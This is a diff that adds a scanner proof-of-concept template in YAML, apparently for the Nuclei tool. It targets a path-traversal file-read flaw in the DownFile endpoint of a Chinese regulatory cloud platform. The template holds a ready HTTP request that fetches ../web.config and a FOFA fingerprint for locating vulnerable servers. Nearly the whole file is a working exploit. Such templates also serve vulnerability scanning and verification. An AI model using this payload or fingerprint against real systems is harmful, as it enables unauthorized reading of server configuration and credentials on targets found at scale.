@@ -1,0 +1,27 @@
+id: poc-nl2m1mlo0yfmytg8
+info:
+  name: 综合监管云平台 DownFile 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nl2m1mlo0yfmytg8'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nl2m1mlo0yfmytg8
+    fofa: body="/Download/DownFile?fileName=SetUp.exe"
+http:
+- raw:
+  - 'GET /Download/DownFile?fileName=../web.config HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Accept-Encoding: gzip
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
